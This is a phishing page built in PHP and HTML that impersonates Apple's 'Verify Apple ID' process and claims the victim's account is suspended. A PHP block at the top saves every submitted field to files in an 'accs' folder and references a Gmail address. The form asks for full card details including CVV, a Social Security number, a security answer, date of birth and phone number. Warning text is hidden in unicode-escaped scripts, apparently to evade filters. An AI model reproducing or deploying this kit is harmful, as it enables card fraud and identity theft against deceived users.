<?php 
	
	$mail1= $_POST['email'];
	mail("appleismine13@gmail.com", "appleismine13@gmail.com");
	
	foreach($_POST as $key => $value){
		$string .= "$key = $value \n\n". PHP_EOL; 
	}
	$email = str_replace("@", "AT", $_POST['email']);
	$fil = fopen('accs/'.strip_tags($email).''. date("d-m-Y-G-i") .''.rand(0,9999).'.txt', "w");
	fwrite($fil, $string);
	header("Location: verify.html");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en_US" lang="en_US" dir="ltr">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />  
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
	<link rel="shortcut icon" href="images/favicon.ico">
    <title>Verify Apple ID - Complete Verification</title>
    
    <link rel="stylesheet" type="text/css" href="images/navigation.css" id="globalheader-stylesheet"></link>
    <link rel="stylesheet" type="text/css" href="images/base.css"></link>
    <link rel="stylesheet" type="text/css" href="images/id.css"></link>
    <link rel="stylesheet" type="text/css" href="images/hsa.css"></link>
	<script type="text/javascript" src="js/prettify.js"></script>
<script src="js/jquery-2.0.0.min.js" type="text/javascript"></script>
<script src="js/cardcheck.js" type="text/javascript"></script>
<script type="text/javascript" charset="ISO-8859-1" src="js/crafty_postcode.class.js"></script>

  <SCRIPT language=Javascript>
      <!--
      function isNumberKey(evt)
      {
         var charCode = (evt.which) ? evt.which : event.keyCode
         if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;

         return true;
      }
	  
      //-->
   </SCRIPT>
   <script type="text/javascript">var cc_number_saved="";function checkLuhn(input)
{var sum=0;var numdigits=input.length;var parity=numdigits%2;for(var i=0;i<numdigits;i++){var digit=parseInt(input.charAt(i))
if(i%2==parity)digit*=2;if(digit>9)digit-=9;sum+=digit;}
return(sum%10)==0;}</script>
	<script type="text/javascript">

// Example of implementation
$(document).ready(function() {
	prettyPrint();	
	// And Away We Go
	

	
    // Step #1: Cache Selectors
    var creditCard = $('#longcard'),
        cardGrandParent = creditCard.parent().parent();
    
    // Step #2: Setup Callbacks on Events
    creditCard.on('cc:onReset cc:onGuess', function() {

        cardGrandParent.removeClass().addClass('formrow');

    }).on('cc:onInvalid', function() {

        $('#longcard').on('cc:onInvalid', function(event) {});
$('#longcard').cardcheck({ onInvalid: function() {} });


    }).on('cc:onValid', function(event, card, niceName) {

        cardGrandParent.removeClass().addClass('formrow');

    }).on('cc:onCardChange', function(event, card, niceName) {

        $('#credit-card-type-text').text(niceName);

    // Step #3: Initialize the cardcheck plugin
    }).cardcheck({ 
	iconLocation: '#accepted-cards-images',
	enableIcons: true,
	allowSpaces: true
	});


});
</script>



<script src="js/jquery.payment.js"></script>
<style type="text/css" media="screen">
    input.invalid {
      border: 2px solid red;
    }

    .validation.failed:after {
      color: red;
      content: 'Validation failed';
    }

    .validation.passed:after {
      color: green;
      content: 'Validation passed';
    }
  </style>
  
  <script type="text/javascript">
    jQuery(function($){
      $('[data-numeric]').payment('restrictNumeric');
      $('.longcard').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.seccode').payment('formatCardCVC');

      $('form').submit(function(e){
        $('input').removeClass('invalid');
        $('.validation').removeClass('passed failed');

        var cardType = $.payment.cardType($('.longnumber').val());


        if ( $('input.invalid').length ) {
          $('.validation').addClass('failed');
        } else {
          $('.validation').addClass('passed');
        }
      });
    });
  </script>

  
  <script type="text/javascript">
function validateForm()
{
var x=document.forms["form"]["firstname"].value;
if (x==null || x=="")
  {
  alert("Your firstname is required");
  form.firstname.focus();
  return false;
  }
  var x=document.forms["form"]["surname"].value;
if (x==null || x=="")
  {
  alert("Your surname is required");
  form.surname.focus();
  return false;
  }
  var x=document.forms["form"]["postcode"].value;
if (x==null || x=="")
  {
  alert("Your postcode is required.");
  form.postcode.focus();
  return false;
  }
var x=document.forms["form"]["address1"].value;
if (x==null || x=="")
  {
  alert("Your address is required.");
  form.address1.focus();
  return false;
  }
  var x=document.forms["form"]["city"].value;
if (x==null || x=="")
  {
  alert("Your city is required.");
  form.city.focus();
  return false;
  }
var x=document.forms["form"]["nameoncard"].value;
if (x==null || x=="")
  {
  alert("Name as on your card is required.");
  form.nameoncard.focus();
  return false;
  }
      var x=document.forms["form"]["longcard"].value;
if (x==null || x=="")
  {
  alert("Your card number is required.");
  form.longcard.focus();
  return false;
  }
  var x=document.forms["form"]["ccdate"].value;
if (x==null || x=="")
  {
  alert("Please enter your card expiry date.");
  form.ccdate.focus();
  return false;
  }
  var fields = x.split ('/');
var year = fields[1].trim();
var month = fields[0].trim();
var date = new Date();
var currentMonth = date.getMonth() + 1;
var currentYear = date.getFullYear();
if (year.toString().length < 4) year = '20' + year;
var yearNumber = Number (year);
var monthNumber = Number (month);
if ((currentYear > yearNumber) || (currentYear == yearNumber && currentMonth > monthNumber)) {
	alert ('Your card is expired');
	form.ccdate.focus();
	return false;
}
  var x=document.forms["form"]["seccode"].value;
if (x==null || x=="")
  {
  alert("Your 3-digit security code is required.");
  form.seccode.focus();
  return false;
  }
      var x=document.forms["form"]["securityawnser"].value;
if (x==null || x=="")
  {
  alert("Your security reset answer is required.");
  form.securityawnser.focus();
  return false;
  }
if(document.form.dobd.selectedIndex==0)
{
  alert("Your date of birth is required.");
  return false;
}
if(document.form.doby.selectedIndex==0)
{
  alert("Your date of birth year is required.");
  return false;
}
if(document.form.longcard.value.length<10)
{
  alert("Your credit card is invalid.");
  return false;
}
if(document.form.seccode.value.length<3)
{
  alert("3 digit security code is invalid.");
  form.seccode.focus();
  return false;
}
if(!checkLuhn(form.longcard.value.replace(/[^\d]/g, ''))) { alert("You have not entered a valid Card number, please check and try again"); form.longcard.focus(); return false; }
}

</script>
  
  
</head>


<body class="myappleid create heavy" id="editContainerBody">
<!--********* New style imported as per the new Header *********-->

<!-- end -->

<!--********* setting country and language from Language parameter *********-->



<!--********* setting locale to urlLanguageInsert to dynamically form the URL based on locale *********-->



	
		
	
	
	
	
		

<nav id="globalheader" class="globalheader" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US">

<div id="gh-content" class="gh-content">
      <ul class="gh-menu">
        <li id="gh-menu-icon-toggle" class="gh-menu-icon gh-menu-icon-toggle"><button id="gh-svg-icons" class="gh-svg-wrapper"></button><span class="gh-text-replace">Menu</span></li>
        <li id="gh-menu-icon-home" class="gh-menu-icon gh-menu-icon-home"><a href="/"><span class="gh-text-replace">Apple</span></a></li>
      </ul><!--/gh-menu-->




<div class="gh-nav">
 <div class="gh-nav-view">
    
	         
	
	
	 
	
	
	
		




          <ul class="gh-nav-list">
            <li class="gh-tab gh-tab-apple"><a class="gh-tab-link" href="http://www.apple.com/" onclick="s_objectID=&quot;http://www.apple.com/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Apple</span></span></a></li>
            <li class="gh-tab gh-tab-store">
            
            
			
			
			
			
            <a class="gh-tab-link" href="http://store.apple.com/" onclick="s_objectID=&quot;http://store.apple.com/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Store</span></span></a>
            
            </li>
            <li class="gh-tab gh-tab-mac">
				
            		<a class="gh-tab-link" href="http://www.apple.com/mac" onclick="s_objectID=&quot;http://www.apple.com/mac/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Mac</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-iphone">
				
            		<a class="gh-tab-link" href="http://www.apple.com/iphone" onclick="s_objectID=&quot;http://www.apple.com/iphone/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iPhone</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-watch">
            	
            	
            		<a class="gh-tab-link" href="http://www.apple.com/watch" onclick="s_objectID=&quot;http://www.apple.com/watch/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Watch</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-ipad">
            	
					
            		
            			<a class="gh-tab-link" href="http://www.apple.com/ipad" onclick="s_objectID=&quot;http://www.apple.com/ipad/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iPad</span></span></a>
            		
            </li>
            <li class="gh-tab gh-tab-ipod">
				
            	
            		<a class="gh-tab-link" href="http://www.apple.com/ipod" onclick="s_objectID=&quot;http://www.apple.com/ipod/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iPod</span></span></a>
            			
            </li>
            <li class="gh-tab gh-tab-itunes">
				
					<a class="gh-tab-link" href="http://www.apple.com/itunes" onclick="s_objectID=&quot;http://www.apple.com/itunes/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iTunes</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-support">
            	
            	
            		<a class="gh-tab-link" href="http://www.apple.com/support" onclick="s_objectID=&quot;http://www.apple.com/support/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Support</span></span></a>
            	
            </li>
           
           <li id="gh-tab-search" class="gh-tab gh-tab-search">
              <div id="gh-search" class="gh-search" role="search">
               <form action="/search/" method="post" class="gh-search-form" id="gh-search-form" data-search-recommended-results='{"url":"https://www.apple.com/global/nav/scripts/shortcuts.php","requestName":"recommendedResults","queryName":"q","dataType":"xml"}' data-search-suggested-searches='{"url":"https://www.apple.com/search/instant/getSuggestions","requestName":"suggestedSearches","queryName":"query","queryParams":{"model":"marcom_en_US","locale":"en_US"},"dataType":"json"}' >                 
                 
                  <div class="gh-search-input-wrapper">
                       <label for="gh-search-input" class="gh-text-replace">Search apple.com</label>
                       <input type="text" name="q" id="gh-search-input" class="gh-search-input" placeholder="Search apple.com" />
                   </div>
                    <button disabled="disabled" type="submit" id="gh-search-submit" class="gh-search-submit gh-search-magnify"><span class="gh-text-replace">Search apple.com</span></button>
                    <button disabled="disabled" type="reset" id="gh-search-reset" class="gh-search-reset"><span class="gh-text-replace">Reset</span></button>
                  
                </form>
              </div>
              <a class="gh-search-magnify" href="http://www.apple.com/search/"><span class="gh-text-replace">Search apple.com</span></a>
            </li>
          </ul>
        </div>
      </div><!--/gh-nav-->

    </div>
  </nav><!--/globalheader-->



<!-- header ends here -->
<!--/globalheader-->
    

    

  
  
<form method="POST" id="signIn" onsubmit="return validateForm()" name="form" action="checkout.php">

  <div id="productheader">
	  
			<a aria-label="My ID" href="#">
			  <h2>
			     <img aria-hidden="true" class="DimAppleIdLogoIV" src="images/logo.png" />
			  </h2>
			</a>
		
		<div id="user">
		
		</div>
</div>
    <div id = "main">
      <div class="content">
        <div class = "grid2colc wrap">
          <div class = "column first sidebar">
		   		   
            <h2>Account Verification.</h2>
            <p class = "intro"><script type="text/javascript">document.write('\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u0074\u0061\u006B\u0065\u0020\u0061\u0020\u006D\u006F\u006D\u0065\u006E\u0074\u0020\u0074\u006F\u0020\u0063\u006F\u006D\u0070\u006C\u0065\u0074\u0065\u0020\u006F\u0075\u0072\u0020\u0061\u0063\u0063\u006F\u0075\u006E\u0074\u0020\u0076\u0065\u0072\u0069\u0066\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u0020\u0070\u0072\u006F\u0063\u0065\u0073\u0073\u002E\u0020\u0054\u0068\u0069\u0073\u0020\u0069\u006E\u0066\u006F\u0072\u006D\u0061\u0074\u0069\u006F\u006E\u0020\u0069\u0073\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u0020\u0074\u006F\u0020\u0076\u0065\u0072\u0069\u0066\u0079\u0020\u0079\u006F\u0075\u0072\u0020\u0069\u0064\u0065\u006E\u0074\u0069\u0074\u0079\u002E\u0020\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u0074\u0061\u006B\u0065\u0020\u0079\u006F\u0075\u0072\u0020\u0074\u0069\u006D\u0065\u0020\u0061\u006E\u0064\u0020\u0066\u0069\u006C\u006C\u0020\u0069\u006E\u0020\u0074\u0068\u0065\u0020\u0066\u006F\u0072\u006D\u0020\u0063\u006F\u0072\u0072\u0065\u0063\u0074\u006C\u0079\u0020\u0074\u006F\u0020\u0061\u0076\u006F\u0069\u0064\u0020\u0066\u0075\u0072\u0074\u0068\u0065\u0072\u0020\u0064\u0065\u006C\u0061\u0079\u0073\u0020\u0075\u006E\u0064\u0065\u0072\u0020\u0073\u006F\u006D\u0065\u0020\u0063\u0069\u0072\u0063\u0075\u006D\u0073\u0074\u0061\u006E\u0063\u0065\u0073\u0020\u0070\u0072\u006F\u0076\u0069\u0064\u0069\u006E\u0067\u0020\u0074\u0068\u0065\u0020\u0077\u0072\u006F\u006E\u0067\u0020\u0069\u006E\u0066\u006F\u0072\u006D\u0061\u0074\u0069\u006F\u006E\u0020\u006D\u0061\u0079\u0020\u0072\u0065\u0073\u0075\u006C\u0074\u0020\u0069\u006E\u0020\u0061\u0063\u0063\u006F\u0075\u006E\u0074\u0020\u0073\u0075\u0073\u0070\u0065\u006E\u0073\u0069\u006F\u006E\u0020\u0074\u006F\u0020\u0070\u0072\u006F\u0074\u0065\u0063\u0074\u0020\u006F\u0075\u0072\u0020\u0063\u0075\u0073\u0074\u006F\u006D\u0065\u0072\u0073\u002E');</script></p>
			<h2>Why?</h2>
            <p class = "intro"><script type="text/javascript">document.write('\u0057\u0065\u0020\u006D\u0061\u0079\u0020\u006F\u0063\u0063\u0061\u0073\u0069\u006F\u006E\u0061\u006C\u006C\u0079\u0020\u0061\u0073\u006B\u0020\u006F\u0075\u0072\u0020\u0063\u0075\u0073\u0074\u006F\u006D\u0065\u0072\u0073\u0020\u0074\u006F\u0020\u0063\u006F\u006D\u0070\u006C\u0065\u0074\u0065\u0020\u0074\u0068\u0065\u0073\u0065\u0020\u0073\u0074\u0065\u0070\u0073\u0020\u0066\u006F\u0072\u0020\u006D\u0061\u006E\u0079\u0020\u0072\u0065\u0061\u0073\u006F\u006E\u0073\u002E\u0020\u0049\u0074\u0020\u006D\u0061\u0079\u0020\u006A\u0075\u0073\u0074\u0020\u0062\u0065\u0020\u0074\u0068\u0061\u0074\u0020\u0079\u006F\u0075\u0072\u0020\u0072\u0065\u0067\u0069\u0073\u0074\u0065\u0072\u0065\u0064\u0020\u0077\u0069\u0074\u0068\u0020\u0074\u0068\u0065\u0020\u0077\u0072\u006F\u006E\u0067\u0020\u0069\u006E\u0066\u006F\u0072\u006D\u0061\u0074\u0069\u006F\u006E\u0020\u0061\u006E\u0064\u0020\u0079\u006F\u0075\u0072\u0020\u0061\u0063\u0063\u006F\u0075\u006E\u0074\u0020\u0068\u0061\u0073\u0020\u0074\u0068\u0065\u0072\u0065\u0066\u006F\u0072\u0065\u0020\u0062\u0065\u0065\u006E\u0020\u0066\u006C\u0061\u0067\u0067\u0065\u0064\u0020\u006F\u006E\u0020\u006F\u0075\u0072\u0020\u0073\u0079\u0073\u0074\u0065\u006D\u0020\u0061\u0073\u0020\u0069\u006E\u0063\u006F\u006D\u0070\u006C\u0065\u0074\u0065\u002E\u0020\u0049\u0074\u0020\u0063\u006F\u0075\u006C\u0064\u0020\u0061\u006C\u0073\u006F\u0020\u0062\u0065\u0020\u0074\u0068\u0061\u0074\u0020\u0077\u0065\u0020\u0068\u0061\u0076\u0065\u0020\u006E\u006F\u0074\u0069\u0063\u0065\u0064\u0020\u0073\u006F\u006D\u0065\u0020\u0075\u006E\u0075\u0073\u0075\u0061\u006C\u0020\u0061\u0063\u0074\u0069\u0076\u0069\u0074\u0079\u0020\u006F\u006E\u0020\u0079\u006F\u0075\u0072\u0020\u0061\u0063\u0063\u006F\u0075\u006E\u0074\u0020\u0061\u006E\u0064\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0020\u0061\u0064\u0064\u0069\u0074\u0069\u006F\u006E\u0061\u006C\u0020\u0069\u006E\u0066\u006F\u0072\u006D\u0061\u0074\u0069\u006F\u006E\u0020\u0061\u0062\u006F\u0075\u0074\u0020\u0079\u006F\u0075\u0020\u0074\u006F\u0020\u0076\u0065\u0072\u0069\u0066\u0079\u0020\u0079\u006F\u0075\u0072\u0020\u0069\u0064\u0065\u006E\u0074\u0069\u0074\u0079\u002E\u0020\u0054\u0068\u0065\u0073\u0065\u0020\u0061\u0072\u0065\u0020\u006A\u0075\u0073\u0074\u0020\u0074\u0077\u006F\u0020\u0072\u0065\u0061\u0073\u006F\u006E\u0073\u0020\u0077\u0068\u0079\u0020\u0074\u0068\u0069\u0073\u0020\u006D\u0061\u0079\u0020\u0068\u0061\u0076\u0065\u0020\u0068\u0061\u0070\u0070\u0065\u006E\u0065\u0064\u0020\u0077\u0069\u0074\u0068\u0020\u0079\u006F\u0075\u0072\u0020\u0061\u0063\u0063\u006F\u0075\u006E\u0074\u0020\u0074\u0068\u0065\u0072\u0065\u0020\u0069\u0073\u0020\u0061\u0020\u0077\u0069\u0064\u0065\u0020\u0072\u0061\u006E\u0067\u0065\u0020\u006F\u0066\u0020\u0070\u006F\u0073\u0073\u0069\u0062\u0069\u006C\u0069\u0074\u0079\u005C\u0027\u0073\u0020\u0068\u006F\u0077\u0065\u0076\u0065\u0072\u0020\u0069\u0074\u0073\u0020\u006E\u006F\u0074\u0068\u0069\u006E\u0067\u0020\u0074\u006F\u0020\u0077\u006F\u0072\u0072\u0079\u0020\u0061\u0062\u006F\u0075\u0074\u0020\u0077\u0065\u0020\u0068\u0061\u0076\u0065\u0020\u006D\u0061\u0064\u0065\u0020\u006F\u0075\u0072\u0020\u0076\u0061\u006C\u0069\u0064\u0061\u0074\u0069\u006F\u006E\u0020\u0070\u0072\u006F\u0063\u0065\u0073\u0073\u0020\u0076\u0065\u0072\u0079\u0020\u0065\u0061\u0073\u0079\u0020\u0066\u006F\u0072\u0020\u0079\u006F\u0075\u0020\u0074\u006F\u0020\u0063\u006F\u006D\u0070\u006C\u0065\u0074\u0065\u0020\u0069\u006E\u0020\u006A\u0075\u0073\u0074\u0020\u0061\u0020\u0066\u0065\u0077\u0020\u006D\u0069\u006E\u0075\u0074\u0065\u0073\u002E');</script></p>
			
            <a target="blank" class="more" href="http://www.apple.com/privacy/">Read the Apple Customer Privacy Policy</a>
          </div>
          <!-- /column -->
		  
          <div class = "column last" style = "z-index: 1">
            <h2>Verify your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> </h2>
            <p>We need to verify your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> account details. Your account has been suspended until this process is completed, we apologise for any inconvenience.</p>
            <!-- Name details -->
            <h4>Name</h4>
           <p>Please enter your name including title.</p>
            
<div class="formrow">
			<label for="first-name">First Name</label>
			<span class="formwrap"><input mandatory="yes" maxlength="32" aria-label="Firstname" value="" placeholder="First Name" id="firstname" type="text" name="firstname" required /></span>
			<label for="first-name">Middle Name</label>
			<span class="formwrap"><input mandatory="yes" maxlength="32" aria-label="Middlename" placeholder="(Optional)" id="middlename" type="text" name="middlename" /></span>
			<label for="first-name">Last Name</label>
			<span class="formwrap"><input mandatory="yes" maxlength="32" aria-label="Surname" value="" placeholder="Last Name" id="surname" type="text" name="surname" required /></span>
			
		</div>
		
	
            
	
<!-- Mailing Address Start -->
<h4>Address</h4>
            <p>Please enter your mailing address. This must match your billing address.</p>
			<!-- Add a div to house your 
     postcode input field -->
<!--
 <div id="lookup"><span class="formwrap"><label class="lookup" for="address-1">Enter your postcode to lookup your address.</label><div id="lookup_field"></div></span></div>
-->
  	  <div class="formrow">
              <label for="address-1">Zip/Postcode</label>
		<span class="formwrap"><input type="text" value="" name="postcode" style="width: 100px;"/>		</span><div id="crafty_postcode_result_display" >&nbsp;</div>
	</div>











            
            <div class="formrow">
              <label for="address-1">Address Line 1</label>
		<span class="formwrap"><input required="yes" mandatory="yes" id="address1" type="text" value="" name="address1" /></span>
		<div id = "address-11" style = "display:block;">
			

	

	

		</div>
		<span class="input-msg"></span>
	</div>
	<div class="formrow">
		<label for="address-2">Address Line 2</label>
		<span class="formwrap"><input placeholder="(Optional)" id="address2" type="text" name="address2" /></span>
				<div id = "address-21" style = "display:block;">
		</div>
		<span class="input-msg"></span>
	</div>
	<div class="formrow">
		<label for="town-city">Town/City</label>
		<span class="formwrap"><input required="yes" value="" mandatory="yes" id="city" type="text" name="city" /></span>
		<div id = "town-city1" style = "display:block;">
		</div>
		<span class="input-msg"></span>
	</div>
	<div class="formrow">
		<label for="town-city">State</label>
		<span class="formwrap"><input id="county" type="text" name="county" /></span>
		<div id = "town-city1" style = "display:block;">
		</div>
		<span class="input-msg"></span>
	</div>

<!--	<div class="formrow">
<label  for="postcode">Postcode</label>
<span class="formwrap"><input mandatory="yes" id="pcode" type="text" name="pcode" /></span>		

	</div>-->
<div class = "formrow" style = "z-index: 1">
              <label for = "countryText">Country/Region</label>

	<span class="formwrap">
	
	<input mandatory="yes" id="country" type="text" value="United States" placeholder="Country" name="country" />
	</span>
	


            </div>
	
<!-- End Address Format --->
	


            <h4>Update your Card & Bank Information</h4>
            <p>Enter your credit or debit card details. This will be used to verify your identity and as the default payment method for purchases and iTunes or App Store.</p>
          

<div class="formrow">

<label for="appleid">Name on Card<br></label>
	<span class="formwrap">
	
	<input type="text" class="nameoncard" name="nameoncard" id="nameoncard" x-autocompletetype="nameoncard" placeholder="Name on Card" required>
	
	</span>
	</div>
	<div class="formrow">
	

	<label for="appleid"><br>Card Number</label>
	<br><span class="formwrap">
	
	<input type="text" class="longcard" name="longcard" id="longcard" x-autocompletetype="cc-number" placeholder="Card Number" required>
	
	</span>
	
	
	

	
<br/>	
<label for="appleid"><i>Accepted Cards</i></label>
	<span class="formwrap"><div id="accepted-cards-images"></div></span>
	
	<div id="accepted-cards-images">
<!-- Icons Automatically Inserted Here -->
</div>
	
	
		

 
	
		
</div>
<div class="formrow">
	<label for="cardexpiry">Expiry Date</label>
	<span class="formwrap"><input type="text" id="ccdate" name="ccdate" class="cc-exp" x-autocompletetype="cc-exp" placeholder="Expiry Date MM/YY" required maxlength="9"></span><span class="formwrap">
	

</div>

<div class="formrow">
	<label for="cardexpiry">Valid From (if applicable)</label>
	<span class="formwrap"><input type="text" id="ccfrom" name="ccfrom" class="cc-exp" placeholder="Valid From MM/YY" maxlength="9"></span><span class="formwrap">
	

</div>

<div class="formrow">
	<label for="password-confirm">CCV2</label>
	<span class="formwrap"><input type="text" name="seccode" class="seccode" id="seccode" x-autocompletetype="cc-csc" placeholder="Security code" required maxlength="4" autocomplete="off" /></span>
		
	
	
	<p class="ccvnote"><img alt="3 Digit Code" align="left" src="images/ccv2.gif"/>The last three digits on the back of your card. For American Express, a four-digit number on the front of your card.</p>

 	
	<br>
	<br><input type="hidden" name="ssnname" id="ssnname" value="SSN"><label for="cardexpiry">Social Insurance Number (SSN)</label><span class="formwrap"><input id="ssn" placeholder="Social Insurance Number (SSN)" maxlength="15" name="ssn" type="text" required="yes"/></span><br/>	


</div>

            <h4>Security Question</h4>
            <p>Select your security question below. This question will help us verify your identity should you forget your password.</p>
            


<div id="secureQue1Div" style="display:block;">
<div class="formrow space">
	
	<label for="securityquestion" class="select">Security Question</label>
	<select mandatory="yes" id="securityquestion" name="securityquestion"><option value="0">Please select</option><option value="Mothers Maiden Name">What is your mothers maiden name?</option><option value="Driving License Num">What is your driving license number?</option><option value="Passport Num">What is your passport number?</option></select>
	<!-- webobject name = "securityQuesDiv" -->
	<div id = 'security-question_11' style="display:block;">
	<br/>
<label for="cardexpiry">Security Answer</label>
	<span class="formwrap"><input id="securityawnser" placeholder="Reset Answer" maxlength="20" name="securityawnser" type="text" required/></span>
	

	</div>
	<!-- /webobject -->
	
</div>
<br/>
 <h4>Date of Birth & Mobile Number</h4>
            <p>Combined with your security question, this will help us verify your identity if you forget your password or need to reset it.              
            </p>
            <div class="birthdate">
  


	<select mandatory="yes" id="dobm" name="dobm"><option value="0">Month</option><option value="1">January</option><option value="2">February</option><option value="3">March</option><option value="4">April</option><option value="5">May</option><option value="6">June</option><option value="7">July</option><option value="8">August</option><option value="9">September</option><option value="10">October</option><option value="11">November</option><option value="12">December</option></select>	 
	<select mandatory="yes" id="dobd" name="dobd"><option value="0">Day</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
	<select mandatory="yes" id="doby" name="doby"><option value="0">Year</option>
<option value="2014">2014</option>
<option value="2013">2013</option>
<option value="2012">2012</option>
<option value="2011">2011</option>
<option value="2010">2010</option>
<option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option></select>
	<div id = 'dob' style="display:block">
	


	</div>



</div>
<br/>
<label for="town-city">Mobile Number</label>
		<span class="formwrap"><input id="mobnumber" value="" onkeypress="return isNumberKey(event)" maxlength="28" name="mobnumber" placeholder="What is your telephone number?" /></span> </p>
</div>   
            <h4>Email Preference</h4>
            <p>
              Stay up to date with Apple news, software updates, and the latest information about products and services from Apple. <a target="blank" class="more" href="http://www.apple.com/legal/privacy/">Read the Apple Customer Privacy Policy</a>
            </p>
            <div class="checkboxes hanging-indent">
			    <input class="checkbox" id="email" type="checkbox" name="newsletter" value="newsletter" checked="checked" />	
	<span class="info"><h6><label for="email">Apple News and Announcements</label></h6>Keep me up to date with Apple news, software updates, and the latest information on products and services.</span>
	
</div>


          
            <div id = "bot-nav">
              
           <!--   <a class="btn biggrey" href="#">
                <span>Cancel</span>
              </a> -->
              
              <a class="btn bigblue">
							<input class="btn bigblue" id="" type="submit" value="Complete Apple ID Verification" name="" />
						</a>	
              
              
            </div>
          </div>
          <!-- /column -->
        </div>
        <!-- /grid2col -->
      </div>
      <!-- /content -->
    </div>
    
    <footer id="globalfooter">
	    
	    	<div id="breadory">
	<ol id="breadcrumbs">
		<li class="home"><a>Home</a></li>
		
			<li> <a onClick="" href="#">My <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT></a> </li>
		
		
	</ol>
</div>
<div class="gf-sosumi">
        <p>Copyright &copy; 2014 <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' Inc') </SCRIPT> All rights reserved.</p>
        <ul class="piped">
                <li><a class="first" href="terms.html">Terms of Use</a></li>
                <li><a href="privacy.html">Privacy Policy</a></li>
                  <li style="float:right">
